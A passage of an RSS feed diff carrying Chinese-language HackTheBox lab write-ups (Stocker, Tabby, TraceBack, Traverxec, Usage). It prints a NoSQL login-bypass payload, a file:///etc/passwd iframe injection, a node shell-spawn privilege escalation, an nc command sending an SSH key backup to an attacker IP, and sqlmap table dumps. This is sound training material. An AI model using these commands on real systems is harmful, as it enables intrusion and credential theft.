+&lt;/h1&gt;&lt;p&gt;端口无发现。有域名扫子域名发现一个dev&lt;/p&gt;
+&lt;p&gt;主网站目录扫描无发现&lt;/p&gt;
+&lt;p&gt;进入子域名让我们登录&lt;/p&gt;
+&lt;p&gt;看wp说有个消息头或者看wazz能看到当前框架是&lt;strong&gt;express&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;这是一个js类型的框架&lt;/p&gt;
+&lt;p&gt;然后联想到绕过node.js登录&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;NoSQL 注入 |黑客技巧&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;{&amp;ldquo;username&amp;rdquo;:{&amp;quot;$ne&amp;quot;:null},&amp;ldquo;password&amp;rdquo;:{&amp;quot;$ne&amp;quot;:null}}&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/stocker/1729410666215-eec91140-0226-4803-b55c-584b0ae25a7c.png&#34;
+	width=&#34;819&#34;
+	height=&#34;415&#34;
+	srcset=&#34;https://example.com/htb/stocker/1729410666215-eec91140-0226-4803-b55c-584b0ae25a7c_hu684a90af2abc373ef2a2b8b0cf63a7f1_98593_480x0_resize_box_3.png 480w, https://example.com/htb/stocker/1729410666215-eec91140-0226-4803-b55c-584b0ae25a7c_hu684a90af2abc373ef2a2b8b0cf63a7f1_98593_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;197&#34;
+		data-flex-basis=&#34;473px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;登录跳转到stock，是一个购物的&lt;/p&gt;
+&lt;p&gt;随便选一个加购购买会生成一个pdf文件，保存用exiltool查看这个pdf文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/stocker/1729410903356-1335457a-7271-4790-999a-32b29fa05774.png&#34;
+	width=&#34;1211&#34;
+	height=&#34;643&#34;
+	srcset=&#34;https://example.com/htb/stocker/1729410903356-1335457a-7271-4790-999a-32b29fa05774_hua9d1b50fc71d190ce830d9d03c6827c9_152867_480x0_resize_box_3.png 480w, https://example.com/htb/stocker/1729410903356-1335457a-7271-4790-999a-32b29fa05774_hua9d1b50fc71d190ce830d9d03c6827c9_152867_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;188&#34;
+		data-flex-basis=&#34;452px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(21, 167, 167);background-color:rgb(242, 243, 245);&#34;&gt;&amp;lt;iframe src=file:///etc/passwd height=1050px width=800px&lt;/iframe&gt;&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/stocker/1729410949552-b1bffc3b-fbf3-4716-bcb6-d3f0456dac75.png&#34;
+	width=&#34;1234&#34;
+	height=&#34;657&#34;
+	srcset=&#34;https://example.com/htb/stocker/1729410949552-b1bffc3b-fbf3-4716-bcb6-d3f0456dac75_hu30511bbfa6b9b39b24b4f03eba327fbf_152038_480x0_resize_box_3.png 480w, https://example.com/htb/stocker/1729410949552-b1bffc3b-fbf3-4716-bcb6-d3f0456dac75_hu30511bbfa6b9b39b24b4f03eba327fbf_152038_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;187&#34;
+		data-flex-basis=&#34;450px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;ssh登录&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;sudo -l查看&lt;/p&gt;
+&lt;p&gt;/usr/bin/node /usr/local/scripts/*.js&lt;/p&gt;
+&lt;p&gt;能用node运行/usr/local/scripts/目录下的js文件&lt;/p&gt;
+&lt;p&gt;但这个目录里我们的用户没用写的权限&lt;/p&gt;
+&lt;p&gt;这里用的是/usr/bin/node是绝对路径，所以环境变量劫持没用&lt;/p&gt;
+&lt;p&gt;看了wp是用/..为一个向上目录&lt;/p&gt;
+&lt;p&gt;然后构造到一个我们可以写js文件的目录&lt;/p&gt;
+&lt;p&gt;比如我们的用户主目录下&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/demo.js&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/stocker/1729411243865-6201d30c-3aae-4cf5-9dc7-6527d81e90eb.png&#34;
+	width=&#34;909&#34;
+	height=&#34;195&#34;
+	srcset=&#34;https://example.com/htb/stocker/1729411243865-6201d30c-3aae-4cf5-9dc7-6527d81e90eb_hu7fee3e427991cc98af75483faa96e824_10250_480x0_resize_box_3.png 480w, https://example.com/htb/stocker/1729411243865-6201d30c-3aae-4cf5-9dc7-6527d81e90eb_hu7fee3e427991cc98af75483faa96e824_10250_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;466&#34;
+		data-flex-basis=&#34;1118px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;require(&amp;#34;child_process&amp;#34;).spawn(&amp;#34;/bin/sh&amp;#34;, {stdio: [0, 1, 2]})
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后拿到root权限&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Tabby</title>
+        <link>https://example.com/htb/tabby/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/tabby/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口22,80,8080,有子域名子域名扫描无发现，目录爆破无发现&lt;/p&gt;
+&lt;p&gt;在一个页面的url看着像文件包含&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/tabby/1727763206443-d8297e7d-e7f2-491e-a529-4cdbc92be711.png&#34;
+	width=&#34;862&#34;
+	height=&#34;619&#34;
+	srcset=&#34;https://example.com/htb/tabby/1727763206443-d8297e7d-e7f2-491e-a529-4cdbc92be711_hu77002f68257e46fbf33fd1fc7e4e0774_196648_480x0_resize_box_3.png 480w, https://example.com/htb/tabby/1727763206443-d8297e7d-e7f2-491e-a529-4cdbc92be711_hu77002f68257e46fbf33fd1fc7e4e0774_196648_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;139&#34;
+		data-flex-basis=&#34;334px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;测试了一会确实能读到相对路径成功的文件&lt;/p&gt;
+&lt;p&gt;然后看8080的网页&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/tabby/1727763257776-2470cd48-ec9e-4671-b917-45954602434c.png&#34;
+	width=&#34;1809&#34;
+	height=&#34;535&#34;
+	srcset=&#34;https://example.com/htb/tabby/1727763257776-2470cd48-ec9e-4671-b917-45954602434c_hu52439d6119c7b25f8b3edb4b04969105_271298_480x0_resize_box_3.png 480w, https://example.com/htb/tabby/1727763257776-2470cd48-ec9e-4671-b917-45954602434c_hu52439d6119c7b25f8b3edb4b04969105_271298_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;338&#34;
+		data-flex-basis=&#34;811px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这里告诉我们说有一个后台网页但需要账号密码，并且他还告诉了我们储存账号密码的文件/etc/tomcat9/tomcat-users.xml位置&lt;/p&gt;
+&lt;p&gt;但这个位置不对，查资料找到正确位置&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/tabby/1727763351692-54a76e54-ec38-4013-8191-d1018288d57e.png&#34;
+	width=&#34;1040&#34;
+	height=&#34;655&#34;
+	srcset=&#34;https://example.com/htb/tabby/1727763351692-54a76e54-ec38-4013-8191-d1018288d57e_hud1a8a8b59b2dd358ed12eeed17f339da_180640_480x0_resize_box_3.png 480w, https://example.com/htb/tabby/1727763351692-54a76e54-ec38-4013-8191-d1018288d57e_hud1a8a8b59b2dd358ed12eeed17f339da_180640_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;158&#34;
+		data-flex-basis=&#34;381px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;登录&lt;/p&gt;
+&lt;p&gt;进入到后台页面虽然有一个还是不能登，但是了解到我们可以从另一个页面上传一个war文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/tabby/1727763490499-b8aec6bc-162e-41b6-a78f-35806cbc0b1e.png&#34;
+	width=&#34;930&#34;
+	height=&#34;494&#34;
+	srcset=&#34;https://example.com/htb/tabby/1727763490499-b8aec6bc-162e-41b6-a78f-35806cbc0b1e_hu022cfc465e87db20df78fdd32dcc284a_109159_480x0_resize_box_3.png 480w, https://example.com/htb/tabby/1727763490499-b8aec6bc-162e-41b6-a78f-35806cbc0b1e_hu022cfc465e87db20df78fdd32dcc284a_109159_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;188&#34;
+		data-flex-basis=&#34;451px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;使用msfvenom制作一个reshell文件并配合curl上传&lt;/p&gt;
+&lt;p&gt;拿到shell&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/tabby/1727763533745-f5d2aa24-50e8-4be6-aaa6-e969c82f07d5.png&#34;
+	width=&#34;1419&#34;
+	height=&#34;274&#34;
+	srcset=&#34;https://example.com/htb/tabby/1727763533745-f5d2aa24-50e8-4be6-aaa6-e969c82f07d5_hu3ea20a613642f7b3906f3dbb10cc2bc4_105393_480x0_resize_box_3.png 480w, https://example.com/htb/tabby/1727763533745-f5d2aa24-50e8-4be6-aaa6-e969c82f07d5_hu3ea20a613642f7b3906f3dbb10cc2bc4_105393_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;517&#34;
+		data-flex-basis=&#34;1242px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h2&gt;&lt;p&gt;在拿到shell的目录下没有发现什么东西，查找conf.db文件也没有结果&lt;/p&gt;
+&lt;p&gt;去看看另一个网页下有没有什么东西&lt;/p&gt;
+&lt;p&gt;/var/www/html&lt;/p&gt;
+&lt;p&gt;在files目录下有个zip文件&lt;/p&gt;
+&lt;p&gt;解压要密码，下到本地的kali去爆破&lt;/p&gt;
+&lt;p&gt;john爆破到密码为admin@it&lt;/p&gt;
+&lt;p&gt;然后解压结果是一套网页的代码，没有其他东西&lt;/p&gt;
+&lt;p&gt;猜测这个密码也是一个用户的密码，试一下ash&lt;/p&gt;
+&lt;p&gt;成功&lt;/p&gt;
+&lt;p&gt;提权到root过程中了解到我们的用户位于lxd权限组，但是我根据流程走的时候失败了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/tabby/1727768606158-434fbde2-9b27-4768-b534-08219e98b854.png&#34;
+	width=&#34;809&#34;
+	height=&#34;335&#34;
+	srcset=&#34;https://example.com/htb/tabby/1727768606158-434fbde2-9b27-4768-b534-08219e98b854_huaa12e6285c1b0ddccd557c7a39577de4_45147_480x0_resize_box_3.png 480w, https://example.com/htb/tabby/1727768606158-434fbde2-9b27-4768-b534-08219e98b854_huaa12e6285c1b0ddccd557c7a39577de4_45147_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;241&#34;
+		data-flex-basis=&#34;579px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>TraceBack</title>
+        <link>https://example.com/htb/traceback/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/traceback/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口，22和80打开网页提示我们说这个网站已经被写入了后门，在互联网上搜索留下的痕迹Xh4H&lt;/p&gt;
+&lt;p&gt;发现后门地址&lt;a class=&#34;link&#34; href=&#34;https://github.com/Xh4H/Web-Shells/blob/master/smevk.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;smevk.php&lt;/a&gt;，账号密码为admin:admin&lt;/p&gt;
+&lt;p&gt;进入cms上传phpshell拿到立足点&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;.ssh文件储存在用户目录下，并且有权限&lt;/p&gt;
+&lt;p&gt;webadmin可以使用一个lua编程语言提升到sysadmin用户&lt;/p&gt;
+&lt;p&gt;之后该系统再每个用户ssh登录时会访问00&amp;gt;header文件，将该文件植入提权木马&lt;/p&gt;
+&lt;p&gt;先创建一个自己的ssh，然后将公共钥匙改名为认证钥匙替换原本的认证钥匙，在使用创建的ssh文件登录，然后触发我们在00&amp;gt;header里植入的代码拿到root&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Traverxec</title>
+        <link>https://example.com/htb/traverxec/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/traverxec/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;namp扫描端口，得知80端口的服务器为Nostromo 1.9.6&lt;/p&gt;
+&lt;p&gt;搜索发现有poc&lt;/p&gt;
+&lt;p&gt;使用msfconsole框架拿到shell&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;h2 id=&#34;从www-data-david&#34;&gt;从www-data-&amp;gt;david
+&lt;/h2&gt;&lt;p&gt;根据机器信息查找配置文件&lt;/p&gt;
+&lt;p&gt;find -name conf&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/traverxec/1725971481140-481d8841-fabf-485f-98cc-be476dd4069f.png&#34;
+	width=&#34;1205&#34;
+	height=&#34;587&#34;
+	srcset=&#34;https://example.com/htb/traverxec/1725971481140-481d8841-fabf-485f-98cc-be476dd4069f_hu8eaff7bb97b4259f1d5b2018a1b13356_209226_480x0_resize_box_3.png 480w, https://example.com/htb/traverxec/1725971481140-481d8841-fabf-485f-98cc-be476dd4069f_hu8eaff7bb97b4259f1d5b2018a1b13356_209226_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;205&#34;
+		data-flex-basis=&#34;492px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;进入有权限的这个文件夹&lt;/p&gt;
+&lt;p&gt;查看配置文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/traverxec/1725971535282-607b826a-34ae-4d8e-8b3d-c236350d1b60.png&#34;
+	width=&#34;630&#34;
+	height=&#34;491&#34;
+	srcset=&#34;https://example.com/htb/traverxec/1725971535282-607b826a-34ae-4d8e-8b3d-c236350d1b60_hu060786845d8d7e990e3003df83c2c588_76519_480x0_resize_box_3.png 480w, https://example.com/htb/traverxec/1725971535282-607b826a-34ae-4d8e-8b3d-c236350d1b60_hu060786845d8d7e990e3003df83c2c588_76519_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;128&#34;
+		data-flex-basis=&#34;307px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;里面有个.htpasswd文件，是错误的&lt;/p&gt;
+&lt;p&gt;关注public_www这个文件夹&lt;/p&gt;
+&lt;p&gt;在/home里，进入david用户目录下访问&lt;/p&gt;
+&lt;p&gt;发现有david的ssh文件的备份&lt;/p&gt;
+&lt;p&gt;用nc连接把这个文件下下来&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kali：nc -lvnp 9933 &amp;gt; backup.tgz
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;靶机：nc 10.10.14.2 9933 &amp;lt; /home/david/public/protected-file-area/backup-ssh-identity-files.tgz
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://example.com/htb/traverxec/1725971692734-3a6394e6-0fb9-4e2f-af2b-db05c06cbdee.png&#34;
+	width=&#34;575&#34;
+	height=&#34;597&#34;
+	srcset=&#34;https://example.com/htb/traverxec/1725971692734-3a6394e6-0fb9-4e2f-af2b-db05c06cbdee_hue61112780658008bbd884ffced090fde_50238_480x0_resize_box_3.png 480w, https://example.com/htb/traverxec/1725971692734-3a6394e6-0fb9-4e2f-af2b-db05c06cbdee_hue61112780658008bbd884ffced090fde_50238_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;96&#34;
+		data-flex-basis=&#34;231px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这三个文件尝试用id_rsa登录david用户，发现有密码&lt;/p&gt;
+&lt;p&gt;我们进行破解&lt;/p&gt;
+&lt;p&gt;首先把id_rsa 使用&lt;font style=&#34;color:rgb(34, 40, 49);background-color:rgb(227, 250, 248);&#34;&gt;SSH2John 将其转换为哈希值&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/traverxec/1725971781178-d5e06fe6-c5f8-408a-b3ba-aa1a6b2723b0.png&#34;
+	width=&#34;401&#34;
+	height=&#34;52&#34;
+	srcset=&#34;https://example.com/htb/traverxec/1725971781178-d5e06fe6-c5f8-408a-b3ba-aa1a6b2723b0_hu61bf01d01e88426f3cad5dcd6febb681_6338_480x0_resize_box_3.png 480w, https://example.com/htb/traverxec/1725971781178-d5e06fe6-c5f8-408a-b3ba-aa1a6b2723b0_hu61bf01d01e88426f3cad5dcd6febb681_6338_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;771&#34;
+		data-flex-basis=&#34;1850px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后使用john破解得到密码hunter&lt;/p&gt;
+&lt;p&gt;用这个用户登录ssh成功&lt;/p&gt;
+&lt;h2 id=&#34;从david-root&#34;&gt;从david-&amp;gt;root
+&lt;/h2&gt;&lt;p&gt;用该命令去找可写目录&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;find / -writable -type d 2&amp;gt;/dev/null&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;没啥发现，在david查看目录&lt;/p&gt;
+&lt;p&gt;发现有个&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/traverxec/1725973703674-c04e3655-dff8-41c1-8895-afc9cef82017.png&#34;
+	width=&#34;885&#34;
+	height=&#34;238&#34;
+	srcset=&#34;https://example.com/htb/traverxec/1725973703674-c04e3655-dff8-41c1-8895-afc9cef82017_hu410028b60e644dd164ddb09312940a35_70111_480x0_resize_box_3.png 480w, https://example.com/htb/traverxec/1725973703674-c04e3655-dff8-41c1-8895-afc9cef82017_hu410028b60e644dd164ddb09312940a35_70111_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;371&#34;
+		data-flex-basis=&#34;892px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;明确看到/usr/bin/journalctl能以root执行&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/traverxec/1725973925074-b501ec27-2b30-4494-b675-aabc40e604c5.png&#34;
+	width=&#34;919&#34;
+	height=&#34;638&#34;
+	srcset=&#34;https://example.com/htb/traverxec/1725973925074-b501ec27-2b30-4494-b675-aabc40e604c5_hu7815719cea7d7bdb4d2208458283340c_32952_480x0_resize_box_3.png 480w, https://example.com/htb/traverxec/1725973925074-b501ec27-2b30-4494-b675-aabc40e604c5_hu7815719cea7d7bdb4d2208458283340c_32952_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;144&#34;
+		data-flex-basis=&#34;345px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service去除后面的管道符提权&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/traverxec/1725973907370-d35b058d-a569-4db2-87dc-ae244993160b.png&#34;
+	width=&#34;862&#34;
+	height=&#34;303&#34;
+	srcset=&#34;https://example.com/htb/traverxec/1725973907370-d35b058d-a569-4db2-87dc-ae244993160b_hu1210b951e2db9d969a4913813ef0b0aa_99659_480x0_resize_box_3.png 480w, https://example.com/htb/traverxec/1725973907370-d35b058d-a569-4db2-87dc-ae244993160b_hu1210b951e2db9d969a4913813ef0b0aa_99659_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;284&#34;
+		data-flex-basis=&#34;682px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Usage</title>
+        <link>https://example.com/htb/usage/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/usage/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口，22,80打开网页，注册个账号，在重置密码处存在sql注入&lt;/p&gt;
+&lt;p&gt;bp抓包用sqlmap跑&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sqlmap -r sql.txt -p email –level 5 –risk 3 –threads 10 –batch –dbs
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;爆库名&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sqlmap -r sql.txt -p email –level 5 –risk 3 –threads 10 –batch -D usage_blog –tables
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;爆表名&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sqlmap -r sql.txt -p email –level 5 –risk 3 –threads 10 –batch -D usage_blog -T admin_users –dump
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;爆列名数据&lt;/p&gt;
+&lt;p&gt;得到数据拿去john解码得到whatever1&lt;/p&gt;
+&lt;p&gt;登录cms&lt;/p&gt;
+&lt;p&gt;得知当前cms版本存在文件上传漏洞，编辑admin身份的图像，本地改为.jpg类型，通过前端验证后抓包改为php执行shell命令&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;h2 id=&#34;dash-xander&#34;&gt;dash-&amp;gt;xander
+&lt;/h2&gt;&lt;p&gt;dash用户执行不了sudo命令，后面发现在用户主目录有一个.monitrc的文件里面有xander用户的密码&lt;/p&gt;
+&lt;p&gt;su 提升&lt;/p&gt;
+&lt;h2 id=&#34;xander-root&#34;&gt;xander-&amp;gt;root
+&lt;/h2&gt;&lt;p&gt;sudo -l查看有一个root文件可用，/usr/bin/usage_management，&lt;/p&gt;
+&lt;p&gt;string /usr/bin/usage_management查看详细信息&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/usage/1724329511323-afa3dd7f-8edf-462d-8aa4-48d3e80c8261.png&#34;
+	width=&#34;1547&#34;
+	height=&#34;1250&#34;
+	srcset=&#34;https://example.com/htb/usage/1724329511323-afa3dd7f-8edf-462d-8aa4-48d3e80c8261_hu8245b905efe21323fb50554c5e260a34_304912_480x0_resize_box_3.png 480w, https://example.com/htb/usage/1724329511323-afa3dd7f-8edf-462d-8aa4-48d3e80c8261_hu8245b905efe21323fb50554c5e260a34_304912_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;123&#34;
+		data-flex-basis=&#34;297px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;搜索得知这个文件可以在/var/www/html文件里，通过自行创建一个文件test,然后用&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
